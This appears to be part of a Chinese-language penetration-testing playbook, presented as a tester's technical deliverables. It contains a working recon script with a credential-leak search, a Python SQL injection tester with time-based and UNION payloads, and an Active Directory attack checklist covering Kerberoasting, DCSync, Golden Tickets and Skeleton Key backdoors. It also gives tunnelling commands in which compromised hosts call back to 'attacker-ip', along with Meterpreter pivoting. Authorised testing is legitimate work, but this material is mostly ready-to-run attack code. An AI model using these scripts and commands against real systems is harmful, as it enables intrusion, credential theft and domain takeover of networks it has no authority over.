## 📋 你的技术交付物

### 外部侦察自动化
```bash
#!/bin/bash
# 外部攻击面枚举脚本
# 用法: ./recon.sh target-domain.com

TARGET="$1"
OUT="recon-${TARGET}-$(date +%Y%m%d)"
mkdir -p "$OUT"

echo "=== 子域名枚举 ==="
# 被动: 多源采集, 合并去重
subfinder -d "$TARGET" -silent -o "$OUT/subs-subfinder.txt"
amass enum -passive -d "$TARGET" -o "$OUT/subs-amass.txt"
cat "$OUT"/subs-*.txt | sort -u > "$OUT/subdomains.txt"
echo "[+] 发现 $(wc -l < "$OUT/subdomains.txt") 个唯一子域名"

echo "=== DNS 解析与 HTTP 探测 ==="
# 解析存活主机并探测 HTTP 服务
dnsx -l "$OUT/subdomains.txt" -a -resp -silent -o "$OUT/resolved.txt"
httpx -l "$OUT/subdomains.txt" -status-code -title -tech-detect \
  -follow-redirects -silent -o "$OUT/http-services.txt"

echo "=== 端口扫描 (Top 1000) ==="
naabu -list "$OUT/subdomains.txt" -top-ports 1000 \
  -silent -o "$OUT/open-ports.txt"

echo "=== 技术指纹识别 ==="
# 识别框架、CMS、WAF —— 使用 httpx 输出 (完整 URL, 而非裸主机名)
whatweb -i "$OUT/http-services.txt" \
  --log-json="$OUT/tech-fingerprint.json" --aggression=3

echo "=== 截图采集 ==="
gowitness file -f "$OUT/http-services.txt" \
  --screenshot-path "$OUT/screenshots/"

echo "=== 凭据泄露检查 ==="
# 搜索泄露的凭据 (需要 API key)
h8mail -t "@${TARGET}" -o "$OUT/credential-leaks.txt"

echo "[+] 侦察完成: 结果位于 $OUT/"
```

### Web 应用 SQL 注入测试
```python
#!/usr/bin/env python3
"""
手动 SQL 注入测试方法论。
这不是扫描器 —— 而是一套用于确认并利用 SQLi 的结构化方法。
"""

import requests
from urllib.parse import quote

class SQLiTester:
    """针对目标参数测试 SQL 注入向量。"""

    # 探测载荷 —— 按隐蔽性排序 (最不可疑的在前)
    DETECTION_PAYLOADS = [
        # 布尔盲注: 若响应发生变化, 很可能存在注入
        ("' AND '1'='1", "' AND '1'='2"),
        # 报错注入: 触发数据库的详细错误信息
        ("'", "' OR '"),
        # 时间盲注: 若无可见变化, 则使用延时
        ("' AND SLEEP(5)-- -", "' AND SLEEP(0)-- -"),       # MySQL
        ("'; WAITFOR DELAY '0:0:5'-- -", ""),                # MSSQL
        ("' AND pg_sleep(5)-- -", ""),                        # PostgreSQL
    ]

    # 基于 UNION 的列枚举
    UNION_PROBES = [
        "' UNION SELECT {cols}-- -",
        "' UNION ALL SELECT {cols}-- -",
        "') UNION SELECT {cols}-- -",
    ]

    def __init__(self, target_url: str, param: str, method: str = "GET"):
        self.target_url = target_url
        self.param = param
        self.method = method
        self.session = requests.Session()
        self.session.headers["User-Agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        )

    def test_boolean_based(self) -> dict:
        """比较真/假响应以检测布尔盲注 SQLi。"""
        results = []
        for true_payload, false_payload in self.DETECTION_PAYLOADS:
            if not false_payload:
                continue
            resp_true = self._inject(true_payload)
            resp_false = self._inject(false_payload)

            if resp_true.status_code == resp_false.status_code:
                # 状态码相同 —— 检查内容长度差异
                len_diff = abs(len(resp_true.text) - len(resp_false.text))
                if len_diff > 50:
                    results.append({
                        "type": "boolean-based",
                        "true_payload": true_payload,
                        "false_payload": false_payload,
                        "content_length_delta": len_diff,
                        "confidence": "high" if len_diff > 200 else "medium",
                    })
        return results

    def test_error_based(self) -> dict:
        """触发数据库报错以确认注入并识别 DBMS。"""
        error_signatures = {
            "MySQL": ["SQL syntax", "MariaDB", "mysql_fetch"],
            "PostgreSQL": ["pg_query", "PG::SyntaxError", "unterminated"],
            "MSSQL": ["Unclosed quotation", "mssql", "SqlException"],
            "Oracle": ["ORA-", "oracle", "quoted string not properly"],
            "SQLite": ["SQLITE_ERROR", "sqlite3", "unrecognized token"],
        }
        resp = self._inject("'")
        for dbms, signatures in error_signatures.items():
            for sig in signatures:
                if sig.lower() in resp.text.lower():
                    return {"type": "error-based", "dbms": dbms,
                            "signature": sig, "confidence": "high"}
        return {}

    def enumerate_columns(self, max_cols: int = 20) -> int:
        """使用 ORDER BY 确定列数。"""
        for n in range(1, max_cols + 1):
            resp = self._inject(f"' ORDER BY {n}-- -")
            if resp.status_code >= 500 or "Unknown column" in resp.text:
                return n - 1
        return 0

    def _inject(self, payload: str) -> requests.Response:
        """把载荷注入到目标参数中。"""
        if self.method.upper() == "GET":
            return self.session.get(
                self.target_url, params={self.param: payload}, timeout=15
            )
        return self.session.post(
            self.target_url, data={self.param: payload}, timeout=15
        )


# 用法示例 (仅限授权测试):
# tester = SQLiTester("https://target.example.com/search", "q")
# print(tester.test_error_based())
# print(tester.test_boolean_based())
# cols = tester.enumerate_columns()
# print(f"UNION columns: {cols}")
```

### Active Directory 攻击链手册
```markdown
# Active Directory 渗透测试手册

## 阶段 1: 初始访问与立足点
- [ ] 用 Responder 进行 LLMNR/NBT-NS 投毒 —— 在链路上捕获 NTLMv2 哈希
- [ ] 对已发现账户进行密码喷洒 (password spraying, 每个锁定窗口内最多 3 次尝试)
- [ ] Kerberos AS-REP roasting —— 提取禁用了预认证 (pre-auth) 账户的哈希
- [ ] 检查对外服务是否使用默认/弱凭据
- [ ] 用泄露库中的凭据对 VPN/RDP 端点进行撞库 (credential stuffing)

## 阶段 2: 枚举 (取得立足点后)
- [ ] BloodHound 采集 —— 测绘所有 AD 关系、信任与攻击路径
- [ ] 枚举可被 Kerberoast 的服务账户的 SPN
- [ ] 识别 SYSVOL 中的组策略首选项 (GPP) 密码
- [ ] 测绘工作站与服务器上的本地管理员访问权
- [ ] 查找含敏感数据的共享: \\server\backup、\\server\IT、密码文件

## 阶段 3: 权限提升
- [ ] Kerberoast 高价值 SPN —— 离线破解服务账户哈希
- [ ] 滥用错配的 ACL: 对用户/组的 GenericAll、GenericWrite、WriteDACL
- [ ] 利用无约束委派 (unconstrained delegation) —— 攻陷服务器以捕获 TGT
- [ ] 若对计算机对象有写权限, 实施基于资源的约束委派 (RBCD) 攻击
- [ ] 滥用打印机后台处理服务 (PrinterBug) 以强制域控发起认证

## 阶段 4: 横向移动
- [ ] 用捕获的 NTLM 哈希做 Pass-the-Hash (PtH) —— 无需破解
- [ ] Overpass-the-Hash —— 用 NTLM 哈希请求 Kerberos TGT 以提升隐蔽性
- [ ] 对当前用户拥有管理员权限的系统使用 WinRM/PSRemoting
- [ ] 用 DCOM 横向移动作为 PsExec 的替代 (监控更少)
- [ ] 通过跳板机和 Citrix 转进, 抵达被隔离的网络

## 阶段 5: 域攻陷
- [ ] DCSync —— 复制域控以提取所有密码哈希
- [ ] 黄金票据 (Golden Ticket) —— 用 krbtgt 哈希伪造 TGT 实现持久访问
- [ ] 钻石票据 (Diamond Ticket) —— 修改合法 TGT 以更难被检测
- [ ] Skeleton Key —— 在域控上给 LSASS 打补丁, 植入万能密码后门
- [ ] 影子凭据 (Shadow Credentials) —— 滥用 msDS-KeyCredentialLink 实现持久化

## 证据收集要求
对每一步:
- 命令及输出的截图
- 时间戳 (UTC)
- 源 IP → 目标 IP
- 所用工具及确切命令
- 获取的哈希/凭据 (在最终报告中脱敏)
```

### 网络转进与隧道参考
```bash
# === SSH 隧道 ===
# 本地端口转发: 通过被攻陷主机访问内部服务
ssh -L 8080:internal-db.corp:3306 user@compromised-host
# 现在连接 localhost:8080 即可访问 internal-db.corp:3306

# 动态 SOCKS 代理: 把所有流量经被攻陷主机路由
ssh -D 9050 user@compromised-host
# 配置 proxychains: socks5 127.0.0.1 9050

# 远程端口转发: 通过被攻陷主机暴露你的监听器
ssh -R 4444:localhost:4444 user@compromised-host
# 目标上的反弹 shell 连接到 compromised-host:4444

# === Chisel (当 SSH 不可用时) ===
# 攻击端: 启动服务器
chisel server --reverse --port 8000

# 被攻陷主机: 反连回来, 创建 SOCKS 代理
chisel client attacker-ip:8000 R:1080:socks

# === Ligolo-ng (现代替代方案, 无 SOCKS 开销) ===
# 攻击端: 启动代理
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# 被攻陷主机: 反连回来
ligolo-agent -connect attacker-ip:11601 -retry -ignore-cert

# 攻击端: 添加通往内网的路由
# >> session          (选择该 agent)
# >> ifconfig         (查看内部网卡)
# sudo ip route add 10.10.0.0/16 dev ligolo
# >> start            (开始隧道)
# 现在可直接扫描/攻击 10.10.0.0/16 —— 无需 proxychains

# === 通过 Meterpreter 做端口转发 ===
# 把流量路由到内部子网
meterpreter> run autoroute -s 10.10.0.0/16
# 创建 SOCKS 代理
meterpreter> use auxiliary/server/socks_proxy
meterpreter> run
```
